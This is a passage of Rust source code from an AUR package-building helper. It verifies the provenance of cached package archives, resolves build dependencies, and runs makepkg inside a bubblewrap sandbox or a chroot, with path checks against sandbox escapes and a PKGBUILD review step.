        let architecture_metadata = alpm_srcinfo::SourceInfoV1::from_string(&srcinfo);
        if !identity
            .architecture
            .as_deref()
            .is_some_and(|architecture| {
                architecture_metadata.as_ref().is_ok_and(|metadata| {
                    Self::archive_architecture_approved(metadata, output, architecture)
                })
            })
        {
            tracing::warn!(
                "Cached artifact provenance for {output}: architecture missing or not approved for this host; rejecting cache hit"
            );
            return false;
        }

        match Self::srcinfo_install_script(&srcinfo, output) {
            Some(install_file) => {
                let Some(embedded) = identity.install_script.as_deref() else {
                    tracing::warn!(
                        "Cached artifact provenance for {output}: reviewed PKGBUILD declares install script '{install_file}' but {} embeds no .INSTALL; rejecting cache hit",
                        archive.display()
                    );
                    return false;
                };
                let expected = match std::fs::read_to_string(pkg_dir.join(&install_file)) {
                    Ok(expected) => expected,
                    Err(error) => {
                        tracing::warn!(
                            "Cached artifact provenance for {output}: cannot read declared install script {install_file}: {error}; rejecting cache hit"
                        );
                        return false;
                    }
                };
                if embedded != expected {
                    tracing::warn!(
                        "Cached artifact provenance for {output}: .INSTALL hook in {} does not match the reviewed install script '{install_file}'; rejecting cache hit",
                        archive.display()
                    );
                    return false;
                }
            }
            None if identity.install_script.is_some() => {
                tracing::warn!(
                    "Cached artifact provenance for {output}: reviewed PKGBUILD declares no install script but {} embeds a .INSTALL hook; rejecting cache hit",
                    archive.display()
                );
                return false;
            }
            None => {}
        }

        true
    }

    /// Read `.PKGINFO` (and `.INSTALL` when present) from a package archive
    /// in a single bounded pass. Returns `Ok(None)` when the archive carries
    /// no `.PKGINFO` member at all.
    fn cached_archive_identity(archive: &Path) -> Result<Option<CachedArchiveIdentity>> {
        let reader = Self::package_archive_reader(archive, MAX_DECOMPRESSED_BYTES)?;
        let mut tar_archive = tar::Archive::new(reader);
        let mut pkginfo: Option<String> = None;
        let mut install_script: Option<String> = None;
        for entry in tar_archive.entries()? {
            let entry = entry?;
            let entry_path = entry.path()?.into_owned();
            let normalized = crate::core::archive::stripped_archive_path(&entry_path, 0)?;
            match normalized.as_deref().and_then(Path::to_str) {
                Some(".PKGINFO") => {
                    anyhow::ensure!(
                        pkginfo.is_none() && entry.header().entry_type().is_file(),
                        "Duplicate or non-regular .PKGINFO"
                    );
                    pkginfo = Some(Self::read_bounded_archive_member(entry)?);
                }
                Some(".INSTALL") => {
                    anyhow::ensure!(
                        install_script.is_none() && entry.header().entry_type().is_file(),
                        "Duplicate or non-regular .INSTALL"
                    );
                    install_script = Some(Self::read_bounded_archive_member(entry)?);
                }
                _ => {}
            }
        }
        let Some(pkginfo) = pkginfo else {
            return Ok(None);
        };
        let architecture = pkginfo
            .lines()
            .filter_map(|line| {
                line.split_once('=').and_then(|(key, value)| {
                    (key.trim() == "arch").then(|| value.trim().to_owned())
                })
            })
            .collect::<Vec<_>>();
        anyhow::ensure!(
            architecture.len() <= 1,
            "Archive has duplicate architecture fields"
        );
        Ok(
            Self::parse_pkginfo_identity(&pkginfo).map(|(name, version, base)| {
                CachedArchiveIdentity {
                    name,
                    version,
                    base,
                    install_script,
                    architecture: architecture.into_iter().next(),
                }
            }),
        )
    }

    /// Read one archive member with the same size cap as `.PKGINFO` reads.
    fn read_bounded_archive_member<R: std::io::Read>(entry: tar::Entry<R>) -> Result<String> {
        if entry.size() > MAX_PKGINFO_BYTES {
            anyhow::bail!("Package metadata member exceeds the {MAX_PKGINFO_BYTES} byte limit");
        }
        let mut content = String::with_capacity(entry.size() as usize);
        entry
            .take(MAX_PKGINFO_BYTES + 1)
            .read_to_string(&mut content)?;
        if content.len() as u64 > MAX_PKGINFO_BYTES {
            anyhow::bail!("Package metadata member exceeds the {MAX_PKGINFO_BYTES} byte limit");
        }
        Ok(content)
    }

    /// Extract `(pkgname, full-version, pkgbase)` from `.PKGINFO` content.
    /// `pkgbase` is mandatory for provenance: makepkg always emits it, so an
    /// archive without one is not a makepkg product and must not be trusted.
    fn parse_pkginfo_identity(content: &str) -> Option<(String, String, String)> {
        let mut name: Option<String> = None;
        let mut version: Option<String> = None;
        let mut base: Option<String> = None;
        for line in content.lines() {
            let Some((key, value)) = line.split_once('=') else {
                continue;
            };
            match key.trim() {
                "pkgname" => {
                    if name.is_some() {
                        return None;
                    }
                    name = Some(value.trim().to_string());
                }
                "pkgver" => {
                    if version.is_some() {
                        return None;
                    }
                    version = Some(value.trim().to_string());
                }
                "pkgbase" => {
                    if base.is_some() {
                        return None;
                    }
                    base = Some(value.trim().to_string());
                }
                _ => {}
            }
        }
        Some((name?, version?, base?))
    }

    /// Extract the `pkgbase` value from `.SRCINFO` text (first occurrence).
    fn srcinfo_pkgbase(content: &str) -> Option<&str> {
        content.lines().find_map(|line| {
            let (key, value) = line.split_once('=')?;
            let value = value.trim();
            (key.trim() == "pkgbase" && !value.is_empty()).then_some(value)
        })
    }

    /// Extract the install script declared for one split-package output in
    /// `.SRCINFO` text. The `install =` key appears inside the block of the
    /// `pkgname =` it belongs to; returns `None` when that output declares
    /// no install script.
    fn srcinfo_install_script(content: &str, pkgname: &str) -> Option<String> {
        let mut block: Option<&str> = None;
        let mut common: Option<String> = None;
        let mut selected: Option<String> = None;
        for line in content.lines() {
            let Some((key, value)) = line.split_once('=') else {
                continue;
            };
            let value = value.trim();
            match key.trim() {
                "pkgname" => block = Some(value),
                "install" if !value.is_empty() => {
                    if block.is_none() {
                        common = Some(value.to_owned());
                    } else if block == Some(pkgname) {
                        selected = Some(value.to_owned());
                    }
                }
                _ => {}
            }
        }
        selected.or(common)
    }

    pub(crate) fn pkg_name_and_version_from_archive(path: &Path) -> Option<(String, String)> {
        Self::pkg_name_and_version_from_archive_result(path)
            .ok()
            .flatten()
    }

    fn package_archive_reader(path: &Path, budget: u64) -> Result<Box<dyn Read>> {
        let pinned = ArchiveSnapshot::from_handoff(&path.to_string_lossy())?;
        let file = match &pinned {
            Some(snapshot) => snapshot.reader()?,
            None => File::open(path)?,
        };
        super::archive_reader::decode(file, budget)
    }

    fn pkg_name_and_version_from_archive_result(path: &Path) -> Result<Option<(String, String)>> {
        let reader = Self::package_archive_reader(path, MAX_DECOMPRESSED_BYTES)?;
        let mut archive = tar::Archive::new(reader);
        for entry in archive.entries()? {
            let entry = entry?;
            let entry_path = entry.path()?;
            if entry_path.components().count() <= 2
                && let Some(file_name) = entry_path.file_name().and_then(|name| name.to_str())
                && matches!(file_name, ".PKGINFO" | "PKGINFO")
            {
                if entry.size() > MAX_PKGINFO_BYTES {
                    anyhow::bail!(
                        "Package metadata in {} exceeds the {} byte limit",
                        path.display(),
                        MAX_PKGINFO_BYTES
                    );
                }
                let mut content = String::with_capacity(entry.size() as usize);
                entry
                    .take(MAX_PKGINFO_BYTES + 1)
                    .read_to_string(&mut content)?;
                if content.len() as u64 > MAX_PKGINFO_BYTES {
                    anyhow::bail!(
                        "Package metadata in {} exceeds the {} byte limit",
                        path.display(),
                        MAX_PKGINFO_BYTES
                    );
                }
                return Ok(Self::parse_pkginfo_name_version(&content));
            }
        }
        Ok(None)
    }

    async fn aur_dependency_plan(
        &self,
        source: &ReviewedSource,
        package: &str,
        requested_outputs: &[String],
    ) -> Result<AurDependencyPlan> {
        let srcinfo = source.required_srcinfo(package)?;
        let requested_outputs = requested_outputs.to_vec();
        let dep_info = tokio::task::spawn_blocking(move || {
            check_dependencies_from_metadata(&srcinfo, &requested_outputs)
        })
        .await
        .context("AUR dependency inspection task failed")?
        .with_context(|| format!("Failed to inspect dependencies for '{package}'"))?;

        let package_outputs = dep_info.package_outputs;
        let missing_dependencies = dep_info
            .missing
            .into_iter()
            .filter(|dependency| {
                let name = dependency_name(dependency);
                !name.is_empty() && name != package
            })
            .collect::<Vec<_>>();
        let (official_dependencies, other_dependencies) = tokio::task::spawn_blocking(move || {
            crate::package_managers::alpm_direct::with_handle(|alpm| {
                let mut official: BTreeMap<String, OfficialTarget> = BTreeMap::new();
                let mut other = Vec::new();
                for dependency in missing_dependencies {
                    if let Some(selected) = resolve_official_dependency(alpm, &dependency)? {
                        if let Some(existing) = official.get_mut(&selected.name) {
                            existing.relations.extend(selected.relations);
                        } else {
                            official.insert(selected.name.clone(), selected);
                        }
                    } else {
                        other.push(dependency);
                    }
                }
                for selected in official.values_mut() {
                    reconcile_official_dependency(alpm, selected)?;
                }
                Ok((official.into_values().collect(), other))
            })
        })
        .await
        .context("Official dependency classification task failed")??;

        let mut aur_dependencies = Vec::new();
        let mut unresolved = Vec::new();
        for dependency in other_dependencies {
            let name = dependency_name(&dependency);
            if self.info(name).await?.is_some() {
                aur_dependencies.push(name.to_string());
            } else {
                unresolved.push(dependency);
            }
        }

        anyhow::ensure!(
            unresolved.is_empty(),
            "Unresolvable dependencies for '{package}': {}",
            unresolved.join(", ")
        );
        aur_dependencies.sort();
        aur_dependencies.dedup();
        Ok(AurDependencyPlan {
            aur_dependencies,
            official_dependencies,
            package_outputs,
        })
    }

    async fn install_official_dependencies(packages: &[OfficialTarget]) -> Result<()> {
        if packages.is_empty() {
            return Ok(());
        }

        let _install_guard = INSTALL_LOCK.lock().await;
        crate::cli::modern_ui::print_info(&format!(
            "Installing official build dependencies: {}",
            packages
                .iter()
                .map(|package| format!("{}/{}", package.repository, package.name))
                .collect::<Vec<_>>()
                .join(", ")
        ));
        let request = InstallRequest::new(
            packages
                .iter()
                .map(|package| InstallItem {
                    target: InstallTarget::Resolved(package.clone()),
                    intent: InstallIntent::Automatic,
                })
                .collect(),
        )?;
        crate::package_managers::arch::install_request(request)
            .await
            .context("Failed to install official AUR build dependencies")
    }

    async fn ensure_dependencies_satisfied(
        &self,
        source: &ReviewedSource,
        package_outputs: &[String],
    ) -> Result<()> {
        let srcinfo = source
            .optional_srcinfo()?
            .context("AUR build has no .SRCINFO")?;
        let package_outputs = package_outputs.to_vec();
        self.blocking_build_work(move || {
            let remaining = check_dependencies_from_metadata(&srcinfo, &package_outputs)
                .context("Failed to verify AUR build dependencies")?
                .missing;
            anyhow::ensure!(
                remaining.is_empty(),
                "AUR build dependencies remain unsatisfied after installation: {}",
                remaining.join(", ")
            );
            Ok(())
        })
        .await
        .context("AUR dependency verification task failed")
    }

    async fn git_clone(&self, package: &str) -> Result<()> {
        self.git_clone_from(package, &format!("{AUR_GIT_URL}/{package}.git"))
            .await
    }

    async fn git_clone_from(&self, package: &str, url: &str) -> Result<()> {
        let safe_url = crate::core::http::redact_url(url);
        let dest = self.build_dir.join(package);

        if let Some(user) = original_user() {
            let home = original_user_home()?;
            let dest_str = dest.to_string_lossy();

            let mut cmd = Command::from(sudo_as_user_program(&user, "git")?);

            if let Some(ref home_path) = home {
                cmd.env("HOME", home_path);
            }

            cmd.args([
                "clone",
                "--depth=1",
                "--filter=blob:none",
                "--",
                url,
                dest_str.as_ref(),
            ]);

            cmd.env("GIT_TERMINAL_PROMPT", "0");
            configure_auxiliary_output(&mut cmd);

            let status = cmd
                .stdin(std::process::Stdio::null())
                .status()
                .await
                .with_context(|| format!("Failed to run git clone as user '{user}'"))?;

            if !status.success() {
                anyhow::bail!("git clone failed for {safe_url}");
            }
        } else {
            let mut command = Command::new("git");
            command
                .args(["clone", "--depth=1", "--filter=blob:none", "--"])
                .arg(url)
                .arg(&dest)
                .env("GIT_TERMINAL_PROMPT", "0")
                .stdin(std::process::Stdio::null());
            configure_auxiliary_output(&mut command);
            let status = command
                .status()
                .await
                .with_context(|| format!("Failed to run git clone for {safe_url}"))?;
            if !status.success() {
                anyhow::bail!("git clone failed for {safe_url}");
            }
        }
        Ok(())
    }

    async fn git_pull(&self, pkg_dir: &Path) -> Result<()> {
        let package = pkg_dir
            .file_name()
            .and_then(|name| name.to_str())
            .context("Invalid AUR source directory")?;
        crate::core::security::validate_package_name(package)?;
        self.refresh_checkout_from(pkg_dir, &format!("{AUR_GIT_URL}/{package}.git"))
            .await
    }

    /// Discard a previously built checkout and clone it again.
    ///
    /// Any checkout a sandboxed PKGBUILD could write is untrusted input:
    /// `.git/config` and `.git/info/attributes` survive `git clean`, and both
    /// can name a filter or hook that Git would then run on the host during an
    /// in-place refresh. Cloning from the remote again is what guarantees the
    /// refresh never executes attacker-controlled Git configuration
    /// (csf_63f859d75634568213c96858).
    async fn refresh_checkout_from(&self, pkg_dir: &Path, url: &str) -> Result<()> {
        let package = pkg_dir
            .file_name()
            .and_then(|name| name.to_str())
            .context("Invalid AUR source directory")?;
        crate::core::security::validate_package_name(package)?;
        remove_dir_as_user(pkg_dir).await?;
        self.git_clone_from(package, url).await
    }

    async fn run_build(
        &self,
        pkg_dir: &Path,
        env: &MakepkgEnv,
        package: &str,
        source: &ReviewedSource,
    ) -> Result<std::process::ExitStatus> {
        self.settings.aur.validate_security_profile()?;
        if !self.settings.aur.allow_network {
            let metadata = source.optional_srcinfo()?;
            let sources = metadata.as_deref().map_or_else(Vec::new, http_sources);
            let summary = download_sources(sources, &env.srcdest).await;
            anyhow::ensure!(
                summary.failed == 0,
                "AUR source prefetch failed; build networking is disabled. Cache the declared sources before retrying."
            );

            // VCS sources (git+, svn+, …) are fetched by makepkg with a VCS
            // client, which cannot reach the network inside the sandbox. Mirror
            // the ones omg can reproduce into SRCDEST, and fail with an
            // actionable message for the rest instead of letting makepkg
            // surface a bare DNS failure from inside the namespace.
            let vcs_sources = metadata.as_deref().map_or_else(Vec::new, vcs_sources);
            if !vcs_sources.is_empty() {
                let vcs = prefetch_vcs_sources(&vcs_sources, &env.srcdest).await;
                anyhow::ensure!(
                    vcs.needs_network.is_empty(),
                    "AUR package '{package}' declares VCS sources that must be fetched while building, \
                     but build networking is disabled and no cached copy exists in SRCDEST: {}. \
                     Set 'aur.allow_network = true' (or pre-populate SRCDEST) and retry.",
                    vcs.needs_network.join(", ")
                );
            }
        }
        match self.settings.aur.build_method {
            AurBuildMethod::Bubblewrap => self.run_sandboxed_makepkg(pkg_dir, env, package).await,
            AurBuildMethod::Chroot => self.run_chroot_build(pkg_dir, env, package).await,
            AurBuildMethod::Native => {
                if !self.settings.aur.allow_unsafe_builds {
                    anyhow::bail!(
                        "Native AUR builds are disabled. Enable 'aur.allow_unsafe_builds' or use bubblewrap/chroot."
                    );
                }
                self.run_native_makepkg(pkg_dir, env, package).await
            }
        }
    }

    /// Run makepkg with bubblewrap sandboxing if available
    /// Falls back to regular makepkg if bwrap is not installed and unsafe builds are allowed
    async fn run_sandboxed_makepkg(
        &self,
        pkg_dir: &Path,
        env: &MakepkgEnv,
        package: &str,
    ) -> Result<std::process::ExitStatus> {
        let bwrap_available = crate::core::privilege::root_controlled_program_path("bwrap").is_ok();

        if bwrap_available {
            tracing::info!("Using bubblewrap sandbox for secure AUR build");

            // Repository dependencies were installed before entering the
            // sandbox; the untrusted build itself receives no sudo-capable TTY.

            // - Read-only bind: /usr, /etc, /lib, /lib64
            // - Writable: Build directory, /tmp
            // - Minimal device access

            // Security: Canonicalize all writable paths to prevent symlink-based sandbox escapes
            // An attacker could create symlink: ~/.cache/omg/aur/evil -> /etc
            // Without this check, we'd bind /etc as writable inside the sandbox
            use super::utils::validate_path_inside;

            // Validate pkg_dir isn't a symlink and is inside build_dir.
            // Fails closed: an uninspectable path is rejected, not trusted.
            if is_symlink(pkg_dir)
                .context("Security: Cannot inspect package directory (potential sandbox escape)")?
            {
                anyhow::bail!(
                    "Security: Package directory is a symlink (potential sandbox escape): {}",
                    pkg_dir.display()
                );
            }
            validate_path_inside(&self.build_dir, pkg_dir)?;

            // Canonicalize all writable bind mount paths
            let pkg_dir_canonical = pkg_dir
                .canonicalize()
                .with_context(|| format!("Failed to canonicalize: {}", pkg_dir.display()))?;
            let pkgdest_canonical = env.pkgdest.canonicalize().with_context(|| {
                format!("Failed to canonicalize pkgdest: {}", env.pkgdest.display())
            })?;
            let srcdest_canonical = env.srcdest.canonicalize().with_context(|| {
                format!("Failed to canonicalize srcdest: {}", env.srcdest.display())
            })?;
            let builddir_canonical = env.builddir.canonicalize().with_context(|| {
                format!(
                    "Failed to canonicalize builddir: {}",
                    env.builddir.display()
                )
            })?;

            // Verify all writable paths are inside user's cache directory (not /etc, /root, etc.)
            let cache_base = paths::cache_dir().canonicalize().with_context(|| {
                format!(
                    "Failed to canonicalize cache directory: {}",
                    paths::cache_dir().display()
                )
            })?;
            for (name, path) in [
                ("pkgdest", &pkgdest_canonical),
                ("srcdest", &srcdest_canonical),
                ("builddir", &builddir_canonical),
            ] {
                if !path.starts_with(&cache_base) {
                    anyhow::bail!(
                        "Security: {} escapes cache directory!\n  Path: {}\n  Allowed: {}/*",
                        name,
                        path.display(),
                        cache_base.display()
                    );
                }
            }
            let compiler_cache_mounts =
                Self::sandbox_cache_mounts(&cache_base, &env.compiler_cache_dirs)?;
            let pgp_home = env
                .pgp_home
                .as_ref()
                .map(|home| {
                    home.path().canonicalize().with_context(|| {
                        format!(
                            "Failed to canonicalize package-scoped PGP keyring: {}",
                            home.path().display()
                        )
                    })
                })
                .transpose()?;
            if let Some(path) = &pgp_home {
                anyhow::ensure!(
                    path.starts_with(&cache_base),
                    "Security: package-scoped PGP keyring escapes cache directory: {}",
                    path.display()
                );
            }

            let pkg_dir_str = pkg_dir_canonical.to_string_lossy();
            let (build_user_name, home) = build_identity();

            let pkgdest_str = pkgdest_canonical.to_string_lossy();
            let srcdest_str = srcdest_canonical.to_string_lossy();
            let builddir_str = builddir_canonical.to_string_lossy();
            let pacman_db_dir = paths::pacman_db_dir_result()?;
            let pacman_db_dir_str = pacman_db_dir.to_string_lossy();
            let pacman_cache_root = paths::pacman_cache_root_dir_result()?;
            let pacman_cache_root_str = pacman_cache_root.to_string_lossy();
            let home_str = home.to_string_lossy();
            let mut mount_destinations = vec![
                home.as_path(),
                pkg_dir_canonical.as_path(),
                pkgdest_canonical.as_path(),
                srcdest_canonical.as_path(),
                pacman_db_dir.as_path(),
                pacman_cache_root.as_path(),
            ];
            mount_destinations.extend(compiler_cache_mounts.iter().map(PathBuf::as_path));
            mount_destinations.extend(pgp_home.as_deref());
            let build_root = sandbox_build_root(&mount_destinations)?;

            // Keep bwrap as omg's direct child for parent-death handling.
            // Its PID namespace makes cancellation kill compiler descendants
            // too; --die-with-parent alone only kills the direct command.
            // --new-session blocks reuse of tty-scoped sudo credentials.
            let mut cmd = sandbox_command(&home, &build_user_name)?;
            if self.settings.aur.allow_network {
                crate::cli::modern_ui::print_warning(
                    "AUR build networking is enabled: untrusted build code can reach host-local and private services.",
                );
            } else {
                cmd.arg("--unshare-net");
            }
            cmd.args([
                "--ro-bind",
                "/usr",
                "/usr",
                "--ro-bind",
                "/etc",
                "/etc",
                "--ro-bind",
                "/lib",
                "/lib",
                "--ro-bind",
                "/lib64",
                "/lib64",
                "--symlink",
                "/usr/bin",
                "/bin",
                "--symlink",
                "/usr/sbin",
                "/sbin",
                "--tmpfs",
            ]);
            cmd.arg(&*home_str);
            configure_sandbox_resolver(&mut cmd)?;

            cmd.args(["--bind"]);
            cmd.arg(&*pkg_dir_str);
            cmd.arg(&*pkg_dir_str);
            cmd.args(["--bind"]);
            cmd.arg(&*pkgdest_str);
            cmd.arg(&*pkgdest_str);
            cmd.args(["--bind"]);
            cmd.arg(&*srcdest_str);
            cmd.arg(&*srcdest_str);
            cmd.args(["--bind"]);
            cmd.arg(&*builddir_str);
            cmd.arg(&build_root);
            for cache_dir in &compiler_cache_mounts {
                cmd.args(["--bind"]);
                cmd.arg(cache_dir);
                cmd.arg(cache_dir);
            }
            if let Some(path) = &pgp_home {
                cmd.args(["--bind"]);
                cmd.arg(path);
                cmd.arg(path);
            }
            cmd.args([
                "--tmpfs",
                "/tmp",
                "--dev",
                "/dev",
                "--proc",
                "/proc",
                "--ro-bind",
            ]);
            cmd.arg(&*pacman_db_dir_str);
            cmd.arg(&*pacman_db_dir_str);
            cmd.args(["--ro-bind"]);
            cmd.arg(&*pacman_cache_root_str);
            cmd.arg(&*pacman_cache_root_str);
            cmd.arg("--chdir");
            cmd.arg(&*pkg_dir_str);
            for (key, value) in [
                ("HOME", home_str.as_ref()),
                ("XDG_CACHE_HOME", "/tmp/.cache"),
                ("USER", build_user_name.as_str()),
                ("LOGNAME", build_user_name.as_str()),
                ("PATH", "/usr/local/sbin:/usr/local/bin:/usr/bin"),
                ("LANG", "C.UTF-8"),
                ("LC_ALL", "C.UTF-8"),
                SANDBOX_FAKEROOT_ENV,
            ] {
                cmd.args(["--setenv", key, value]);
            }
            cmd.args(["--setenv", "MAKEFLAGS"]);
            cmd.arg(&env.makeflags);
            cmd.args(["--setenv", "PKGDEST"]);
            cmd.arg(&*pkgdest_str);
            cmd.args(["--setenv", "SRCDEST"]);
            cmd.arg(&*srcdest_str);
            cmd.args(["--setenv", "BUILDDIR"]);
            cmd.arg(&build_root);
            if let Some(path) = &pgp_home {
                cmd.args(["--setenv", "GNUPGHOME"]);
                cmd.arg(path);
            }

            for (key, value) in &env.extra_env {
                cmd.args(["--setenv", key, value]);
            }

            // Use sandbox-safe args (no -s since deps installed above)
            let makepkg_args = self.makepkg_args_sandbox();
            cmd.args(["--", "makepkg"]);
            cmd.args(makepkg_args);

            cmd.stdin(Stdio::null());
            self.run_logged_build_command(&mut cmd, package, BuildIsolation::ProcessGroup)
                .await
                .context("Failed to run sandboxed makepkg")
        } else {
            if !self.settings.aur.allow_unsafe_builds {
                return Err(AurError::SandboxUnavailable.into());
            }

            tracing::debug!("bubblewrap not found, using regular makepkg");
            println!(
                "{} Building without sandbox (install 'bubblewrap' for isolation)...",
                crate::cli::style::dim("→")
            );
            self.run_native_makepkg(pkg_dir, env, package).await
        }
    }

    async fn run_native_makepkg(
        &self,
        pkg_dir: &Path,
        env: &MakepkgEnv,
        package: &str,
    ) -> Result<std::process::ExitStatus> {
        let (build_user, build_home) = build_identity();

        // Install and rollback reject root before reaching the build path.
        // Untrusted PKGBUILDs still need an allowlisted environment.
        let mut cmd = native_build_command()?;
        configure_build_environment(&mut cmd, &build_home, &build_user);
        if let Some(pgp_home) = &env.pgp_home {
            cmd.env("GNUPGHOME", pgp_home.path());
        }

        // no_new_privs blocks privilege gains even with global sudo tickets.
        // setsid detaches the authentication TTY and propagates the build status.

        cmd.args(self.makepkg_args())
            .env("MAKEFLAGS", &env.makeflags)
            .env("PKGDEST", &env.pkgdest)
            .env("SRCDEST", &env.srcdest)
            .env("BUILDDIR", &env.builddir);

        for (key, value) in &env.extra_env {
            cmd.env(key, value);
        }

        cmd.current_dir(pkg_dir).stdin(Stdio::null());
        self.run_logged_build_command(&mut cmd, package, BuildIsolation::NativeSession)
            .await
            .context("Failed to run makepkg")
    }

    async fn run_chroot_build(
        &self,
        pkg_dir: &Path,
        env: &MakepkgEnv,
        package: &str,
    ) -> Result<std::process::ExitStatus> {
        anyhow::ensure!(
            self.settings.aur.allow_unsafe_builds,
            "Chroot devtools execute AUR recipe code on the host before isolation. Use bubblewrap, or explicitly enable aur.allow_unsafe_builds to accept host code execution."
        );
        crate::cli::modern_ui::print_warning(
            "AUR chroot devtools will execute recipe code on the host as your user before entering the chroot; private build storage does not isolate that host code.",
        );
        anyhow::ensure!(
            self.settings.aur.allow_network,
            "Chroot devtools cannot enforce offline builds; choose bubblewrap or explicitly enable aur.allow_network"
        );
        let mut cmd = if let Ok(pkgctl) =
            crate::core::privilege::root_controlled_program_path("pkgctl")
        {
            let mut cmd = Command::new(pkgctl);
            cmd.arg("build");
            if self.settings.aur.secure_makepkg {
                cmd.arg("--clean");
            }
            cmd
        } else if let Ok(makechrootpkg) =
            crate::core::privilege::root_controlled_program_path("makechrootpkg")
        {
            let mut cmd = Command::new(makechrootpkg);
            cmd.args(["-r", "/var/lib/archbuild"]).arg("--");
            cmd
        } else {
            anyhow::bail!(
                "Chroot build requires devtools (pkgctl/makechrootpkg). Install devtools or choose bubblewrap/native."
            );
        };

        let (build_user, build_home) = build_identity();
        configure_build_environment(&mut cmd, &build_home, &build_user);
        if let Some(pgp_home) = &env.pgp_home {
            cmd.env("GNUPGHOME", pgp_home.path());
        }
        cmd.current_dir(pkg_dir)
            .env("MAKEFLAGS", &env.makeflags)
            .env("PKGDEST", &env.pkgdest)
            .env("SRCDEST", &env.srcdest)
            .env("BUILDDIR", &env.builddir)
            .stdin(Stdio::null());
        for (key, value) in &env.extra_env {
            cmd.env(key, value);
        }

        self.run_logged_build_command(&mut cmd, package, BuildIsolation::ProcessGroup)
            .await
            .context("Failed to run chroot build")
    }

    fn build_log_path(&self, package: &str) -> PathBuf {
        self.build_dir.join("_logs").join(format!("{package}.log"))
    }

    async fn run_logged_build_command(
        &self,
        command: &mut Command,
        package: &str,
        isolation: BuildIsolation,
    ) -> Result<std::process::ExitStatus> {
        self.run_logged_build_command_with_limits(
            command,
            package,
            MAX_AUR_BUILD_LOG_BYTES,
            MAX_AUR_BUILD_DURATION,
            isolation,
        )
        .await
    }

    async fn run_logged_build_command_with_limits(
        &self,
        command: &mut Command,
        package: &str,
        max_log_bytes: u64,
        max_duration: Duration,
        isolation: BuildIsolation,
    ) -> Result<std::process::ExitStatus> {
        let log_path = self.build_log_path(package);
        let log_dir = log_path
            .parent()
            .context("AUR build log path must have a parent directory")?;
        tokio::fs::create_dir_all(log_dir).await.with_context(|| {
            format!(
                "Failed to create build log directory: {}",
                log_dir.display()
            )
        })?;
        let log = tokio::fs::OpenOptions::new()
            .create(true)
            .truncate(true)
            .write(true)
            .mode(0o600)
            .open(&log_path)
            .await
            .with_context(|| format!("Failed to create build log: {}", log_path.display()))?;
        let log = Arc::new(tokio::sync::Mutex::new(BuildLog {
            file: log,
            bytes: 0,
            limit: max_log_bytes,
        }));

        let progress = crate::cli::modern_ui::aur_build_progress(package, &log_path);
        let verbose =
            crate::cli::modern_ui::output_mode() == crate::cli::modern_ui::OutputMode::Verbose;

        command
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(true);
        match isolation {
            BuildIsolation::ProcessGroup => {
                command.process_group(0);
            }
            BuildIsolation::NativeSession => {
                // A group leader makes util-linux setsid fork, losing the PID
                // tracked below. Inherit our group so setsid execs in-place;
                // makepkg then owns a detached session whose PGID is child.id().
                let parent_group = nix::unistd::getpgrp().as_raw();
                // Zero can denote a group outside our PID namespace. Passing
                // it to setpgid creates a child group instead of inheriting it.
                if parent_group != 0 {
                    command.process_group(parent_group);
                }
            }
        }
        let child = command
            .spawn()
            .with_context(|| format!("Failed to start AUR build for '{package}'"))?;
        let process_group = child.id().context("AUR build has no process ID")?;
        let mut build = BuildProcess {
            child: Some(child),
            group: process_group,
            reaper: tokio::runtime::Handle::current(),
        };
        let child = build
            .child
            .as_mut()
            .context("AUR build child was not available")?;
        let stdout = child
            .stdout
            .take()
            .context("AUR build stdout pipe was not available")?;
        let stderr = child
            .stderr
            .take()
            .context("AUR build stderr pipe was not available")?;

        let stdout_capture = Box::pin(drain_build_output(
            stdout,
            Arc::clone(&log),
            BuildOutputStream::Stdout,
            verbose,
        ));
        let stderr_capture = Box::pin(drain_build_output(
            stderr,
            Arc::clone(&log),
            BuildOutputStream::Stderr,
            verbose,
        ));
        let result = tokio::time::timeout(max_duration, async {
            tokio::try_join!(child.wait(), stdout_capture, stderr_capture)
        })
        .await;

        let status = match result {
            Ok(Ok((status, (), ()))) => status,
            Ok(Err(error)) => {
                build.terminate_and_reap().await?;
                progress.finish(false);
                return Err(error).context("AUR build output capture failed");
            }
            Err(_) => {
                build.terminate_and_reap().await?;
                progress.finish(false);
                anyhow::bail!(
                    "AUR build exceeded the {}-second duration limit",
                    max_duration.as_secs()
                );
            }
        };
        build.child = None;
        let capture_result: Result<()> = async {
            log.lock()
                .await
                .file
                .flush()
                .await
                .context("Failed to flush AUR build log")?;
            Ok(())
        }
        .await;

        progress.finish(status.success() && capture_result.is_ok());
        capture_result?;
        Ok(status)
    }

    fn makepkg_args(&self) -> Vec<&'static str> {
        let mut args = vec!["--noconfirm", "-f", "--needed"];
        if self.settings.aur.secure_makepkg {
            args.push("--cleanbuild");
        }
        args
    }

    /// Makepkg args for sandboxed builds (no -s since deps are pre-installed)
    fn makepkg_args_sandbox(&self) -> Vec<&'static str> {
        let mut args = vec!["--noconfirm", "-f"];
        if self.settings.aur.secure_makepkg {
            args.push("--cleanbuild");
        }
        args
    }

    /// Display and confirm a PKGBUILD before any script-driven side effect.
    ///
    /// Captures all local build inputs and their manifest digest so the caller
    /// can reject additions, removals, permission changes and modified content
    /// immediately before building.
    async fn review_pkgbuild(
        package: &str,
        pkgbuild_path: &Path,
        profile: crate::config::AurSecurityProfile,
    ) -> Result<ReviewedSource> {
        // Quiesce before joining the review queue: a queued review should
        // hold one continuous quiesce across the wait and confirm, so
        // concurrent spinners neither flicker nor overwrite review output.
        let _quiesce_guard = crate::cli::modern_ui::quiesce_terminal();
        // Parallel build waves may discover several independent packages at
        // once. One review owns the terminal at a time so prompts and source
        // text cannot interleave.
        let _review_guard = REVIEW_LOCK.lock().await;
        if !console::user_attended() {
            anyhow::bail!(
                "PKGBUILD review requires an interactive terminal. Run in an interactive terminal to review each PKGBUILD, or set aur.review_pkgbuild=false if you accept unreviewed AUR code."
            );
        }

        let source_dir = pkgbuild_path.parent().context("Missing source directory")?;
        let source = ReviewedSource::capture(source_dir)?;
        let pkgbuild_bytes = source
            .files
            .get(Path::new("PKGBUILD"))
            .context("AUR review captured no PKGBUILD")?;
        let review = pkgbuild_review_text(pkgbuild_bytes)?;
        let extra_files: Vec<AurReviewFiles<'_>> = source
            .files
            .iter()
            .filter(|(path, _)| path.as_path() != Path::new("PKGBUILD"))
            .map(|(path, bytes)| AurReviewFiles {
                relative: path.as_path(),
                bytes: bytes.len(),
                digest: pkgbuild_digest(bytes),
            })
            .collect();
        let verbose = crate::cli::modern_ui::is_verbose();
        let install_hooks = declared_install_hook_previews(&source)?;
        println!(
            "{}",
            pkgbuild_review_panel(
                package,
